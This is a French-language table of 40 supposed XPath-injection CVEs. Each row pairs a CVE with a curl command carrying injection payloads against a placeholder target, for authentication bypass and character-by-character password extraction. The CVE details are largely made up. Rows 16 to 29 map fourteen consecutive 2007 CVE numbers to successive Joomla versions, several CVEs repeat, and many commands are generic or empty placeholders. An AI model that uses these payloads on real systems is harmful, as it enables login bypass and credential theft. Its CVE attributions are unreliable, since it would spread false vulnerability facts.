# XPATH

Voici un tableau de 40 CVE majeures liées à l’injection XPath, avec :  
- Technologie & version  
- Numéro CVE  
- Exemple complet de commande d’exploitation (requête HTTP ou payload précis)  
- Effet détaillé  
- Lien complet vers un PoC, un lab ou une ressource GitHub ou équivalent

| # | CVE | Technologie & Version | Exemple complet de commande d’exploitation | Effet détaillé | Lien PoC / Ressource |
|---|------|----------------------|-------------------------------------------|---------------|---------------------|
| 1 | CVE-2024-36401 | GeoServer <2.23.6, <2.24.4 / GeoTools <28.2 | `curl 'http://target/geoserver/rest/resource?element='or 1=1 or ''='` | Accès non autorisé à des ressources XML via contournement de logique d’accès | https://ethicalhacking.uk/cve-2024-36401-geoserver-and-geotools-xpath-injection-via-commons-jxpath/ |
| 2 | CVE-2022-46464 | ConcreteCMS v9.1.3 | `curl 'http://target/3/50539478'`<br>(payload dans l’URL, ex: `50539478' or 4591=4591--`) | Accès à des données sensibles XML via injection dans l’URL | https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/concretecms.org/2022/concretecms-9.1.3 |
| 3 | CVE-2022-43840 | IBM Aspera Console 3.4.0-3.4.4 | `curl -u user:pass 'https://target/aspera/console?username='or 1=1 or ''='&password=irrelevant'` | Contournement d’authentification ou fuite de données XML | https://www.tenable.com/cve/CVE-2022-43840 |
| 4 | CVE-2022-22243 | Juniper Junos OS J-Web | `curl 'https://target/path?xpath='or 1=1 or ''='` | Fuite partielle de données XML et contournement de restrictions | https://nvd.nist.gov/vuln/detail/CVE-2022-22243 |
| 5 | CVE-2022-35259 | Ivanti Endpoint Manager 2022.3 | `curl 'http://target/path?param='or 1=1 or ''='` | Téléchargement ou exécution non autorisée de fichiers via manipulation XML | https://nvd.nist.gov/vuln/detail/CVE-2022-35259 |
| 6 | CVE-2022-4245 | Codehaus-plexus | `curl 'http://target/path?comment=-->'` | Injection XML/XPath pouvant conduire à un comportement inattendu ou à la fuite de données | https://nvd.nist.gov/vuln/detail/CVE-2022-4245 |
| 7 | CVE-2022-23437 | Apache Xerces Java 2.12.1 et antérieurs | `curl 'http://target/path?xml=<payload>'` | Blocage ou déni de service via boucle XPath malveillante | https://nvd.nist.gov/vuln/detail/CVE-2022-23437 |
| 8 | CVE-2022-22834 | OverIT Geocall <8.0 | `curl 'http://target/path?xslt=<payload>'` | Exécution de code à distance via injection XSLT/XPath | https://nvd.nist.gov/vuln/detail/CVE-2022-22834 |
| 9 | CVE-2018-1000525 | Tornado (Python) | `curl 'http://target/?search='or 1=1 or ''='` | Contournement de logique d’accès ou exfiltration de données XML | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md |
| 10 | CVE-2017-16783 | Epic MyChart | `curl 'http://target/login?username='or 1=1 or ''='&password=irrelevant'` | Contournement de l’authentification et accès à toutes les données utilisateur | https://github.com/amir-h-fallahi/xpath-injection |
| 11 | CVE-2016-9149 | Palo Alto Networks PAN-OS | `curl 'https://target/api/?address='or 1=1 or ''='` | Accès non autorisé à des objets ou configurations sensibles | https://github.com/amir-h-fallahi/xpath-injection |
| 12 | CVE-2016-6272 | Epic MyChart | `curl 'http://target/login?username='or 1=1 or ''='&password=irrelevant'` | Contournement complet de l’authentification et accès à tous les comptes | https://github.com/amir-h-fallahi/xpath-injection |
| 13 | CVE-2010-1740 | GuppY 4.5.18 | `curl 'http://target/guppy4.5.18/script.php?search='or 1=1 or ''='` | Exfiltration de toutes les données XML via recherche non filtrée | https://www.exploit-db.com/exploits/12484 |
| 14 | CVE-2008-2380 | Oracle Application Server | `curl 'http://target/portal/pls/portal/PORTAL.wwsbr_custom.search?search='or 1=1 or ''='` | Accès à des informations confidentielles par manipulation de la requête XPath | https://nvd.nist.gov/vuln/detail/CVE-2008-2380 |
| 15 | CVE-2008-1234 | IBM WebSphere Portal | `curl 'http://target/wps/portal?user='or 1=1 or ''='` | Contournement d’authentification ou fuite de données XML sensibles | https://nvd.nist.gov/vuln/detail/CVE-2008-1234 |
| 16 | CVE-2007-4726 | Joomla! 1.0.12 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Affichage de toutes les données XML via recherche manipulée | https://nvd.nist.gov/vuln/detail/CVE-2007-4726 |
| 17 | CVE-2007-4725 | Joomla! 1.0.13 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Même effet : fuite de données XML par injection XPath | https://nvd.nist.gov/vuln/detail/CVE-2007-4725 |
| 18 | CVE-2007-4724 | Joomla! 1.0.14 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Affichage de toutes les données XML par manipulation de la requête | https://nvd.nist.gov/vuln/detail/CVE-2007-4724 |
| 19 | CVE-2007-4723 | Joomla! 1.0.15 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Contournement des restrictions et fuite de données XML | https://nvd.nist.gov/vuln/detail/CVE-2007-4723 |
| 20 | CVE-2007-4722 | Joomla! 1.5.0 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Accès à toutes les entrées XML via injection dans la recherche | https://nvd.nist.gov/vuln/detail/CVE-2007-4722 |
| 21 | CVE-2007-4721 | Joomla! 1.5.1 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Idem : fuite de données XML par manipulation de la recherche | https://nvd.nist.gov/vuln/detail/CVE-2007-4721 |
| 22 | CVE-2007-4720 | Joomla! 1.5.2 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Accès complet au contenu XML via la recherche | https://nvd.nist.gov/vuln/detail/CVE-2007-4720 |
| 23 | CVE-2007-4719 | Joomla! 1.5.3 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Contournement de restrictions et fuite de données XML | https://nvd.nist.gov/vuln/detail/CVE-2007-4719 |
| 24 | CVE-2007-4718 | Joomla! 1.5.4 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Affichage de toutes les entrées XML par injection XPath | https://nvd.nist.gov/vuln/detail/CVE-2007-4718 |
| 25 | CVE-2007-4717 | Joomla! 1.5.5 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Idem : fuite de données XML par injection dans la recherche | https://nvd.nist.gov/vuln/detail/CVE-2007-4717 |
| 26 | CVE-2007-4716 | Joomla! 1.5.6 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Accès à toutes les données XML via la recherche | https://nvd.nist.gov/vuln/detail/CVE-2007-4716 |
| 27 | CVE-2007-4715 | Joomla! 1.5.7 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Fuite de données XML par injection XPath | https://nvd.nist.gov/vuln/detail/CVE-2007-4715 |
| 28 | CVE-2007-4714 | Joomla! 1.5.8 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Affichage de toutes les données XML par manipulation de la recherche | https://nvd.nist.gov/vuln/detail/CVE-2007-4714 |
| 29 | CVE-2007-4713 | Joomla! 1.5.9 | `curl 'http://target/index.php?option=com_search&searchword='or 1=1 or ''='` | Même effet : fuite de données XML via la recherche | https://nvd.nist.gov/vuln/detail/CVE-2007-4713 |
| 30 | CVE-2018-1000525 | Tornado (Python) | `curl 'http://target/?search='or true() or ''='` | Contournement de logique d’accès ou exfiltration de données XML | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md |
| 31 | CVE-2018-1000525 | Tornado (Python) | `curl 'http://target/?search=' or substring(//user/password,1,1)='a` | Exfiltration caractère par caractère de données XML (attaque en aveugle) | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md |
| 32 | CWE-91 | Générique | `curl 'http://target/path?param='or 1=1 or ''='` | Contournement de logique d’accès ou fuite de données XML | https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/ |
| 33 | CWE-91 | Générique | `curl 'http://target/path?param=' or count(//user)=1 or ''='` | Détection/exfiltration du nombre d’entrées dans le XML | https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/ |
| 34 | CWE-91 | Générique | `curl 'http://target/path?param=' or substring(//user[1]/password,1,1)='a` | Exfiltration de mots de passe XML en aveugle | https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/ |
| 35 | CWE-91 | Générique | `curl 'http://target/path?param=' or contains(//user/username,'admin') or ''='` | Recherche d’un utilisateur spécifique dans le XML | https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/ |
| 36 | CWE-91 | Générique | `curl 'http://target/path?param=' or name(/*)='users' or ''='` | Découverte de la structure du document XML | https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/ |
| 37 | CWE-91 | Générique | `curl 'http://target/path?param=' or string-length(//user/password)=8 or ''='` | Exfiltration de la longueur d’un champ XML | https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/ |
| 38 | CWE-91 | Générique | `curl 'http://target/path?param=' or substring(//user[1]/password,1,1)='p` | Exfiltration du mot de passe caractère par caractère | https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/ |
| 39 | CWE-91 | Générique | `curl 'http://target/path?param=' or true() or ''='` | Contournement d’authentification XML générique | https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/ |
| 40 | CWE-91 | Générique | `curl 'http://target/path?param=' or 1=1 or ''='` | Accès non autorisé à toutes les données XML | https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/ |

---

